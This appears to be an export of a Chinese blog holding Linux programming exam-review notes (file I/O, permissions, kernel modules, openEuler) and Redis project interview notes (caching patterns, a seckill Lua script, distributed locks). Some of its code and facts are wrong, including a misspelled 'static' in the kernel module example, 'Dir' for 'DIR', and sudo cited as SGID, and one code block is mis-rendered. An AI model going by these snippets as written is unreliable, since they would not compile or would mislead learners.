<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241215220626467.png" alt="image-20241215220626467" style="zoom:50%;" />
</li>
<li><p>输入单个字符：getc，fgetc，getchar</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241215220643095.png" alt="image-20241215220643095" style="zoom:50%;" />
</li>
<li><p>输出单个字符：putc，fputc，putchar</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241215220654609.png" alt="image-20241215220654609" style="zoom:50%;" />
</li>
<li><p>输入一行字符串：fgets，gets</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241215220703948.png" alt="image-20241215220703948" style="zoom:50%;" />
</li>
<li><p>输出一行字符串：fputs，puts</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241215220711458.png" alt="image-20241215220711458" style="zoom:50%;" />
</li>
<li><p>二进制流IO：fread&#x2F;fwrite</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241215220723773.png" alt="image-20241215220723773" style="zoom:50%;" />

<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241215220742676.png" alt="image-20241215220742676" style="zoom:50%;" />
</li>
<li><p>格式化IO：scanf，fscanf，sscanf</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241215220750865.png" alt="image-20241215220750865" style="zoom:50%;" />
</li>
<li><p>格式化IO：printf，fprintf，sprintf</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241215220802935.png" alt="image-20241215220802935" style="zoom:50%;" />
</li>
<li><p>重定位流：fseek（移动指针），ftell（获取指针位置），rewind（将指针移动到开头），fgetpos（获取指针位置），fsetpos（移动指针位置）</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241215220814240.png" alt="image-20241215220814240" style="zoom:50%;" />
</li>
<li><p>刷新流：fflush</p>
   <img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241215220822188.png" alt="image-20241215220822188" style="zoom:50%;" />
</li>
<li><p>流与文件描述符</p>
</li>
<li><p>临时文件</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241215220830699.png" alt="image-20241215220830699" style="zoom:50%;" /></li>
</ol>
<h5 id="文件属性"><a href="#文件属性" class="headerlink" title="文件属性"></a>文件属性</h5><ol>
<li><p>获取文件status：stat，fstat，lstat（前两个对于链接文件，返回实际文件信息，第三个返回链接自身信息）</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241215220840282.png" alt="image-20241215220840282" style="zoom:50%;" />
</li>
<li><p>stat结构：</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241215220848006.png" alt="image-20241215220848006" style="zoom:50%;" />
</li>
<li><p>SUID、SGID、Sticky bit</p>
<ul>
<li>SUID：会认为文件的执行者是文件拥有者（而不是执行的人），这样运行该程序的用户就可以以文件拥有者的身份执行程序，从而获得文件拥有者的特权。如 su</li>
<li>SGID：认为文件的执行组是文件所在组（而不是执行的人所在的组）；对于一个目录，在该目录下创建文件，会认为是目录拥有者创建。如 sudo</li>
<li>Sticky bit：用于防止用户删除其他用户拥有的文件或目录，只有该目录的拥有者、文件拥有者和root用户才能删除该目录中的文件。</li>
</ul>
<p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241215220856267.png" alt="image-20241215220856267"></p>
</li>
<li><p>测试文件权限：access</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241215220902850.png" alt="image-20241215220902850" style="zoom:50%;" />
</li>
<li><p>改变文件权限：chmod&#x2F;fchmod</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241215220910401.png" alt="image-20241215220910401" style="zoom:50%;" />
</li>
<li><p>改变文件所有者：chown&#x2F;fchown&#x2F;lchown</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241215220918010.png" alt="image-20241215220918010" style="zoom:50%;" />
</li>
<li><p>设置文件权限屏蔽字：umask</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241215220923096.png" alt="image-20241215220923096" style="zoom:50%;" />
</li>
<li><p>硬链接：link&#x2F;unlink</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241215220927867.png" alt="image-20241215220927867" style="zoom:50%;" />
</li>
<li><p>软连接：symlink&#x2F;readlink</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241215220932873.png" alt="image-20241215220932873" style="zoom:50%;" /></li>
</ol>
<h5 id="目录处理"><a href="#目录处理" class="headerlink" title="目录处理"></a>目录处理</h5><ol>
<li><p>目录结构：</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241215220937914.png" alt="image-20241215220937914" style="zoom:50%;" />
</li>
<li><p>创建与删除目录：mkdir&#x2F;rmdir </p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241215220943151.png" alt="image-20241215220943151" style="zoom:50%;" />
</li>
<li><p>切换工作目录：chdir，fchdir</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241215220948318.png" alt="image-20241215220948318" style="zoom:50%;" />
</li>
<li><p>获取路径：getcwd</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241215220952735.png" alt="image-20241215220952735" style="zoom:50%;" />
</li>
<li><p>打开、关闭、读、定位</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241215220957614.png" alt="image-20241215220957614" style="zoom:50%;" />
</li>
<li><p>示例：目录扫描</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Dir *dp;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dirent</span> *<span class="title">entry</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((dp=opendir(dir)) == <span class="literal">NULL</span>)</span><br><span class="line">	err_sys(<span class="string">&quot;wrong&quot;</span>);</span><br><span class="line"><span class="keyword">while</span> ((entry = readdir(dp)) != <span class="literal">NULL</span>)&#123;</span><br><span class="line">	lstat(entry-&gt;d_name,&amp;statbuf);</span><br><span class="line">	<span class="keyword">if</span> (S_ISDIR(statbuf.st_mode))</span><br><span class="line">		...</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		...</span><br><span class="line">&#125;</span><br><span class="line">closedir(dp);</span><br></pre></td></tr></table></figure></li>
</ol>
<h5 id="文件锁"><a href="#文件锁" class="headerlink" title="文件锁"></a>文件锁</h5><ol>
<li><p>文件锁分类</p>
<ul>
<li>记录锁：按记录加锁（可以只锁文件的一部分）</li>
<li>劝告锁：检查、加锁由应用程序自己控制，不会强制应用程序不允许访问，只是提醒</li>
<li>强制锁：检查、加锁由内核控制，影响open、read、write</li>
<li>共享锁：可以读</li>
<li>排他锁：读写均不可</li>
</ul>
</li>
<li><p>flock结构</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241215221004865.png" alt="image-20241215221004865" style="zoom:50%;" />
</li>
<li><p>记录锁：fcntl</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241215221014328.png" alt="image-20241215221014328" style="zoom:50%;" />
</li>
<li><p>lockf</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241215221024483.png" alt="image-20241215221024483" style="zoom:50%;" /></li>
</ol>
<h4 id="linux内核"><a href="#linux内核" class="headerlink" title="linux内核"></a>linux内核</h4><ol>
<li><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241215221030804.png" alt="image-20241215221030804" style="zoom:80%;" />
</li>
<li><p>层次结构</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241215221037276.png" alt="image-20241215221037276" style="zoom:50%;" />
</li>
<li><p>驱动：</p>
<ul>
<li>许多常见驱动的源代码集成在内核源码里</li>
<li>也有第三方开发的驱动，可以单独编译成模块.ko</li>
<li>编译需要内核头文件的支持</li>
</ul>
</li>
<li><p>加载模块</p>
<ul>
<li>底层命令<ul>
<li>insmod（装载一个模块，只有超级用户可以使用该命令）</li>
<li>rmmod（卸载一个模块）</li>
</ul>
</li>
<li>高层命令<ul>
<li>modprobe（相当于多次insmod，自动加载依赖）</li>
<li>modprobe -r （-r：模块闲置不用时，自动卸载模块）</li>
</ul>
</li>
</ul>
</li>
<li><p>模块依赖</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241215221045121.png" alt="image-20241215221045121" style="zoom:50%;" />
</li>
<li><p>模块通讯：模块是为了完成某种特定任务而设计的。 其功能比较的单一，为了丰富系统的功能 ，所以模块之间常常进行通信。其之间可以共享变量，数据结构，也可以调用对方提供的功能函数。</p>
</li>
<li><p>模块相关命令：</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241215221051531.png" alt="image-20241215221051531" style="zoom:50%;" />
</li>
<li><p>Linux内核模块与应用程序的区别</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241215221055939.png" alt="image-20241215221055939" style="zoom:50%;" />
</li>
<li><p>注意点：</p>
<ul>
<li>不能使用C库来开发驱动程序</li>
<li>没有内存保护机制</li>
<li>小内核栈</li>
<li>并发上的考虑</li>
</ul>
</li>
<li><p>例子，最简单的内核模块例子：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">hello_init</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">	printk(KERN_INFO <span class="string">&quot;Hello world\n&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">srarcit <span class="type">void</span> __exit <span class="title function_">hello_exit</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">	printk(KERN_INFO <span class="string">&quot;GoodBye\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">module_init(hello_init);</span><br><span class="line">module_exit(hello_exit);</span><br></pre></td></tr></table></figure>

<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241215221102434.png" alt="image-20241215221102434" style="zoom:50%;" /></li>
</ol>
<h4 id="openEuler操作系统"><a href="#openEuler操作系统" class="headerlink" title="openEuler操作系统"></a>openEuler操作系统</h4><ol>
<li><p>鲲鹏处理器：基于ARMv8-64指令集开发的通用处理器，作为一款现代处理器，它早已经不是仅仅包含ALU的运算单元了。在其物理架构上包含SoC、Chip、DIE、cluster、 core等概念。</p>
<ul>
<li><p>鲲鹏920具有L1、L2、L3共三级cache，L1和L2两级cache由各个CPU core独享</p>
</li>
<li><p>鲲鹏处理器支持CPU Core虚拟化、内存虚拟化、中断虚拟化以及SMMU等多项虚拟化技术。</p>
</li>
<li><p>鲲鹏处理器与openEuler操作系统有着非常紧密的联系，openEuler天然地支持鲲鹏 处理器，并能够充分发挥处理器的各种特性。</p>
</li>
</ul>
</li>
<li><p>openEuler出现于2019年年底，是一款通用服务器操作系统，支持x86和ARM等多种处理器架构，  适用于数据库、大数据、云计算、人工智能等各种应用场景。</p>
</li>
<li><p>openEuler是一款基于Linux内核的通用操作系统；为了充分发挥鲲鹏处理器的优势，openEuler在多核调用技术、软硬件协同、轻 量级虚拟化、指令级优化和智能优化引擎等方面做了增强。</p>
</li>
<li><p>多核调度：openEuler使用了先进先出、轮转调度、优先级调度以及CFS 调度算法：</p>
<ul>
<li>CFS调度算法使用了时间片和优先级的概念，并且引入了虚拟运行时间，使得操作系统按照当前系统的负载和普通进程的优先级给该进程分配CPU使用的比例，从而确保了普通进程的相对公平</li>
<li>在openEuler中，每个处理器都有一个迁移线程(称为migration&#x2F;CPUID)，每个迁移线程都有一个由函数组成的停机工作队列</li>
</ul>
</li>
<li><p>NUMA-aware Qspinlock：openEuler采用CAN(Compact NUMA-aware Lock)队列代替Qspinlock中的MCS队列：</p>
<ul>
<li>CNA队列是MCS队列的一种变体</li>
<li>MCS将等待获取锁的线程组织在一个队列中，而CNA则将等待获取锁的线程组织为 两个队列：一个主队列，一个辅助队列</li>
<li>主队列的线程队头运行在相同的NUMA节点上。辅助队列的线程与主队列队头运行 在不同NUMA节点上</li>
</ul>
</li>
<li><p>KAE：openEuler通过提供鲲鹏加速引擎(Kunpeng Accelerator Engine，KAE)插件，使能 Kunpeng硬件加速能力，包括：</p>
<ul>
<li>对称&#x2F;非对称加密</li>
<li>数字签名</li>
<li>压缩解压缩等算法，用于加速SSL&#x2F;TLS应用和数据压缩</li>
</ul>
</li>
<li><p>iSula：iSula为全量的容器软件栈，包括引擎、网络、存储、工具集与容器OS：</p>
<ul>
<li>iSulad是一个轻量级容器引擎，采用C&#x2F;C++语言实现，相比其它容器引擎，它的内存 开销更小，并发性能更高</li>
<li>iSulad容器引擎主要包括通信模块、镜像模块、运行时模块</li>
</ul>
</li>
<li><p>A-Tune：自调优工具A-Tune旨在让操作系统能够满足不同应用场景的性能诉求，降低性能调优过程中反复调参的人工成本，提升性能调优效率</p>
<ul>
<li>A-Tune整体上是一个C&#x2F;S架构</li>
<li>A-Tune目前主要提供智能决策和自动调优两个能力</li>
</ul>
</li>
</ol>
]]></content>
      <categories>
        <category>Linux程序设计</category>
      </categories>
      <tags>
        <tag>期末复习</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>RedisProject</title>
    <url>/2025/01/18/RedisProject/</url>
    <content><![CDATA[<p>copy from 李亚飞</p>
<h1 id="1-Redis相关"><a href="#1-Redis相关" class="headerlink" title="1. Redis相关"></a>1. Redis相关</h1><h2 id="1-1-Redis常用命令"><a href="#1-1-Redis常用命令" class="headerlink" title="1.1 Redis常用命令"></a>1.1 Redis常用命令</h2><h2 id="1-2-如何使用Redis"><a href="#1-2-如何使用Redis" class="headerlink" title="1.2 如何使用Redis"></a>1.2 如何使用Redis</h2><p>1.使用Redis做缓存</p>
<p>2.使用setIfAbsent来实现互斥锁（setnx命令，set if not exist）</p>
<p>3.使用increment自增实现ID生成器</p>
 <span id="more"></span>

<h2 id="1-3-使用了哪些Redis数据类型？"><a href="#1-3-使用了哪些Redis数据类型？" class="headerlink" title="1.3 使用了哪些Redis数据类型？"></a>1.3 使用了哪些Redis数据类型？</h2><ul>
<li><strong>string</strong>：在使用验证码登录的时候，缓存手机号对应的验证码；在查询商店信息的时候，缓存商店信息</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//手机号 对应 验证码</span></span><br><span class="line">stringRedisTemplate.opsForValue().set(LOGIN_CODE_KEY + phone, code, LOGIN_CODE_TTL, TimeUnit.MINUTES);</span><br><span class="line">stringRedisTemplate.opsForValue().get(LOGIN_CODE_KEY + phone);</span><br><span class="line"></span><br><span class="line"><span class="comment">//商店id 对应 商店信息</span></span><br></pre></td></tr></table></figure>

<ul>
<li><strong>hash</strong>：缓存登录成功的用户信息，信息有id、昵称等</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//缓存登录成功的用户 token 对应 用户信息（map类型）</span></span><br><span class="line"><span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> query().eq(<span class="string">&quot;phone&quot;</span>, phone).one();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (user == <span class="literal">null</span>) &#123;</span><br><span class="line">    user = createUserWithPhone(phone);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">String</span> <span class="variable">token</span> <span class="operator">=</span> UUID.randomUUID().toString();</span><br><span class="line"><span class="type">UserDTO</span> <span class="variable">userDTO</span> <span class="operator">=</span> BeanUtil.copyProperties(user, UserDTO.class);</span><br><span class="line">Map&lt;String, Object&gt; userMap = BeanUtil.beanToMap(userDTO, <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;(),</span><br><span class="line">        CopyOptions.create()</span><br><span class="line">                .setIgnoreNullValue(<span class="literal">true</span>)</span><br><span class="line">                .setFieldValueEditor((fieldName, fieldValue) -&gt; fieldValue.toString()));</span><br><span class="line"></span><br><span class="line"><span class="type">String</span> <span class="variable">tokenKey</span> <span class="operator">=</span> LOGIN_USER_KEY + token;</span><br><span class="line">stringRedisTemplate.opsForHash().putAll(tokenKey, userMap);</span><br><span class="line">stringRedisTemplate.expire(tokenKey, LOGIN_USER_TTL, TimeUnit.MINUTES);</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>set</strong>：购买过优惠券的用户放在set中，判断当前用户是否购买过</li>
</ul>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="keyword">local</span> voucherId = ARGV[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">local</span> userId = ARGV[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">--- 库存key</span></span><br><span class="line"><span class="keyword">local</span> stockKey = <span class="string">&#x27;seckill:stock:&#x27;</span> .. voucherId</span><br><span class="line"><span class="comment">---·订单key</span></span><br><span class="line"><span class="keyword">local</span> orderKey = <span class="string">&#x27;seckill:order:&#x27;</span> .. voucherId</span><br><span class="line"></span><br><span class="line"><span class="comment">--- 判断库存是否充足</span></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">tonumber</span>(redis.call(<span class="string">&#x27;get&#x27;</span>, stockKey)) &lt;= <span class="number">0</span>) <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="comment">--- 判断用户是否重复购买</span></span><br><span class="line"><span class="keyword">if</span>(redis.call(<span class="string">&#x27;sismember&#x27;</span>, orderKey, userId) == <span class="number">1</span>) <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="comment">--- 扣减库存，并记录用户购买信息</span></span><br><span class="line">redis.call(<span class="string">&#x27;incrby&#x27;</span>, stockKey, <span class="number">-1</span>)</span><br><span class="line">redis.call(<span class="string">&#x27;sadd&#x27;</span>, orderKey, userId)</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span></span><br></pre></td></tr></table></figure>

<h2 id="1-4-如何保证Redis集群情况下分布式锁分可靠性？"><a href="#1-4-如何保证Redis集群情况下分布式锁分可靠性？" class="headerlink" title="1.4 如何保证Redis集群情况下分布式锁分可靠性？"></a>1.4 如何保证Redis集群情况下分布式锁分可靠性？</h2><ul>
<li>**RedLock算法：**向所有Redis节点发送加锁请求，成功超半数才算成功加锁；释放锁的时候要对所有节点都发起释放锁的操作</li>
<li>缺点：已经拿到锁的线程A由于GC暂停或业务超时导致锁被释放，后续线程成功拿到锁，但此时线程A还认为自己持有锁。</li>
<li>改进：<ul>
<li>获取锁成功时给线程一个自增的令牌**（Fencing Token）**，资源管理服务器在接受线程更新数据时校验令牌是否比当前已经记录的令牌大，如果大就正常接受，如果小说明是已经过期的令牌</li>
<li>使用Raf共识算法</li>
</ul>
</li>
</ul>
<h1 id="1-如何实现验证码登录功能的？"><a href="#1-如何实现验证码登录功能的？" class="headerlink" title="1.如何实现验证码登录功能的？"></a>1.如何实现验证码登录功能的？</h1><ul>
<li>首先用户输入手机号，然后点击发送验证码，服务端收到这个请求之后，校验手机号是否合法，然后生成验证码（随机6位数），以前缀和手机号为key保存验证码到Redis中</li>
<li>客户端根据收到的验证码填入并登录，服务端收到请求之后，从Redis中校验验证码和手机号是否匹配，如果匹配就成功登录，则将用户的信息保存到Redis中，并返回随机token给客户端；客户端后续请求都带着这个token在作为autorization放在请求头里面。</li>
</ul>
<p><a href="https://gitee.com/snailhking/my-picture/raw/master/Image/202403071736600.png"><img data-src="https://gitee.com/snailhking/my-picture/raw/master/Image/202403071736600.png" alt="img"></a></p>
<h1 id="2-缓存更新策略"><a href="#2-缓存更新策略" class="headerlink" title="2. 缓存更新策略"></a>2. 缓存更新策略</h1><p>![image-20250225141924104](&#x2F;Users&#x2F;effy&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20250225141924104.png)</p>
<h2 id="2-1-主动更新策略"><a href="#2-1-主动更新策略" class="headerlink" title="2.1 主动更新策略"></a>2.1 主动更新策略</h2><ol>
<li>**Cache Aside Pattern(旁路缓存)：**由缓存的调用者，在更新数据库的同时更新缓存</li>
<li>**Read&#x2F;Write Through Pattern(读写穿透)：**缓存与数据库整合为一个服务，由服务来维护一致性。调用者调用该服务，无需关心缓存一致性问题</li>
<li>**Write Behind Patter(异步缓存写入)：**调用者只更新缓存，由其他线程异步地将缓存数据持久化道数据库，保证最终一致性</li>
</ol>
<h2 id="2-2-删除缓存还是更新缓存？"><a href="#2-2-删除缓存还是更新缓存？" class="headerlink" title="2.2 删除缓存还是更新缓存？"></a>2.2 删除缓存还是更新缓存？</h2><ul>
<li>更新缓存：每次更新数据库都更新缓存，无效写操作较多 ❌</li>
<li>删除缓存：更新数据库时让缓存失效，查询时再更新缓存 ✅</li>
</ul>
<h2 id="2-3-如何保证缓存与数据库操作的同时成功或失败"><a href="#2-3-如何保证缓存与数据库操作的同时成功或失败" class="headerlink" title="2.3 如何保证缓存与数据库操作的同时成功或失败"></a>2.3 如何保证缓存与数据库操作的同时成功或失败</h2><ul>
<li>单体系统：将缓存与数据库操作放在一个事务</li>
<li>分布式系统：利用TCC等分布式事务方案</li>
</ul>
<h2 id="2-4-先操作缓存还是先操作数据库"><a href="#2-4-先操作缓存还是先操作数据库" class="headerlink" title="2.4 先操作缓存还是先操作数据库"></a>2.4 先操作缓存还是先操作数据库</h2><ul>
<li><p>先删除缓存，再操作数据库 ❌</p>
<p>![image-20250225144641785](&#x2F;Users&#x2F;effy&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20250225144641785.png)</p>
</li>
<li><p>先操作数据库，再删除缓存 ✅</p>
<p>![image-20250225144716561](&#x2F;Users&#x2F;effy&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20250225144716561.png)</p>
</li>
</ul>
<h1 id="3-如何解决缓存三大问题？"><a href="#3-如何解决缓存三大问题？" class="headerlink" title="3. 如何解决缓存三大问题？"></a>3. 如何解决缓存三大问题？</h1><h2 id="3-1-缓存穿透"><a href="#3-1-缓存穿透" class="headerlink" title="3.1 缓存穿透"></a>3.1 缓存穿透</h2><ul>
<li><p>定义：请求<strong>大量缓存和数据库中都不存在的值</strong>，导致请求直接落到数据库</p>
</li>
<li><p>解决方案</p>
<ul>
<li><p><strong>缓存空值</strong></p>
<ul>
<li><p>优点：实现简单，效率高</p>
</li>
<li><p>缺点：存储大量null值，空间占用大</p>
</li>
<li><pre><code class="language-java">// 使用缓存空值解决商铺信息缓存穿透问题： 
if (shop == null) &#123;
  stringRedisTemplate.opsForValue().set(key, &quot;&quot;, CACHE_NULL_TTL, TimeUnit.MINUTES);
  return Result.fail(&quot;店铺不存在&quot;);
&#125;
<figure class="highlight swift"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="operator">-</span> <span class="operator">**</span>布隆过滤器<span class="operator">**</span></span><br><span class="line"></span><br><span class="line">  <span class="operator">-</span> 优点：空间占用少</span><br><span class="line"></span><br><span class="line">  <span class="operator">-</span> 缺点：实现复杂，存在误判可能</span><br><span class="line"></span><br><span class="line">  <span class="operator">-</span> ```java</span><br><span class="line">    使用布隆过滤器解决商铺信息缓存穿透问题：</span><br><span class="line">    <span class="meta">@PostConstruct</span></span><br><span class="line">    <span class="keyword">public</span> void <span class="keyword">init</span>() &#123;</span><br><span class="line">        <span class="type">RBloomFilter</span>&lt;<span class="type">Object</span>&gt; bloomFilter <span class="operator">=</span> redissonClient.getBloomFilter(<span class="string">&quot;shop&quot;</span>);</span><br><span class="line">        bloomFilter.tryInit(10000L, <span class="number">0.02</span>);</span><br><span class="line">        <span class="type">List</span>&lt;<span class="type">Shop</span>&gt; ids <span class="operator">=</span> query().select(<span class="string">&quot;id&quot;</span>).list();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">Shop</span> shop: ids) &#123;</span><br><span class="line">            bloomFilter.add(shop.getId());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">Result</span> queryById(<span class="type">Long</span> id) &#123;</span><br><span class="line">        <span class="type">String</span> key <span class="operator">=</span> <span class="type">CACHE_SHOP_KEY</span> <span class="operator">+</span> id;</span><br><span class="line">        <span class="comment">//0. 先查布隆过滤器</span></span><br><span class="line">        <span class="type">RBloomFilter</span>&lt;<span class="type">Object</span>&gt; bloomFilter <span class="operator">=</span> redissonClient.getBloomFilter(<span class="string">&quot;shop&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="operator">!</span>bloomFilter.contains(id)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="type">Result</span>.fail(<span class="string">&quot;shop doesn&#x27;t exist!!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        <span class="comment">//1. 布隆过滤器有，再查缓存</span></span><br><span class="line">        <span class="operator">...</span></span><br><span class="line">        <span class="comment">//2. 缓存没有，再查数据库</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
</code></pre>
</li>
</ul>
</li>
<li><p>增强id的复杂度，避免被猜测id规律</p>
</li>
<li><p>做好数据的基础格式校验</p>
</li>
<li><p>加强用户权限校验</p>
</li>
<li><p>做好热点参数的限流</p>
</li>
</ul>
</li>
</ul>
<h2 id="3-2-缓存雪崩"><a href="#3-2-缓存雪崩" class="headerlink" title="3.2 缓存雪崩"></a>3.2 缓存雪崩</h2><ul>
<li>定义：同一时段<strong>大量的缓存key失效</strong>或者Redis服务宕机，导致大量请求到达数据库</li>
<li>解决方案：<ul>
<li>给不同的key的TTL添加随机值</li>
<li>利用Redis集群提高服务可用性</li>
<li>给缓存业务添加降级限流策略</li>
<li>给业务添加多级缓存</li>
</ul>
</li>
</ul>
<h2 id="3-3-缓存击穿"><a href="#3-3-缓存击穿" class="headerlink" title="3.3 缓存击穿"></a>3.3 缓存击穿</h2><ul>
<li>定义：缓存击穿也叫<strong>热点key</strong>问题，即一个高并发访问并且缓存重建业务较复杂的key突然失效，无数请求直接打到数据库上。</li>
<li>解决方案</li>
</ul>
<table>
<thead>
<tr>
<th></th>
<th>互斥锁</th>
<th>逻辑过期</th>
</tr>
</thead>
<tbody><tr>
<td>概念</td>
<td>线程A发现缓存过期，加锁重建缓存，后续线程获取锁失败自旋重试直至线程A释放锁，此时缓存重建成功</td>
<td>不设置过期时间，但在value中添加逻辑过期字段，线程A查询热点key发现value中逻辑时间过期，则线程A加锁并另起线程B重建缓存，线程A直接返回旧数据（不需等待线程B执行结束），后续线程C查询缓存发现过期后尝试加锁，如果加锁失败则说明有线程正在重建缓存，线程C也直接返回旧数据即可，线程B重建完缓存后释放锁</td>
</tr>
<tr>
<td>优点</td>
<td>没有额外的内存消耗<br />保证一致性<br />实现简单</td>
<td>线程无需等待，性能较好</td>
</tr>
<tr>
<td>缺点</td>
<td>线程需要等待，性能受到影响<br />可能有死锁风险</td>
<td>不保证一致性<br />有额外内存消耗<br />实现复杂</td>
</tr>
<tr>
<td>示意图</td>
<td>![image-20250119151602588](&#x2F;Users&#x2F;effy&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20250119151602588.png)</td>
<td>![image-20250119151633156](&#x2F;Users&#x2F;effy&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;image-20250119151633156.png)</td>
</tr>
</tbody></table>
<h1 id="4-全局唯一ID生成器如何实现的？"><a href="#4-全局唯一ID生成器如何实现的？" class="headerlink" title="4. 全局唯一ID生成器如何实现的？"></a>4. 全局唯一ID生成器如何实现的？</h1><ul>
<li><p>项目中使用的ID是一个64位的整数，其中第一位是符号位，永远为0，然后拼接31位的时间戳，再拼接32位Redis中存的自增值。</p>
<ul>
<li><p>时间戳以秒为单位，根据当前时间和基准时间的时间差计算得来，基准时间是预先设置好的，31位的时间戳最长可以支持69年左右；</p>
</li>
<li><p>32位的自增值是秒内的计数器，支持每秒产生2^32个不同的ID</p>
</li>
</ul>
</li>
</ul>
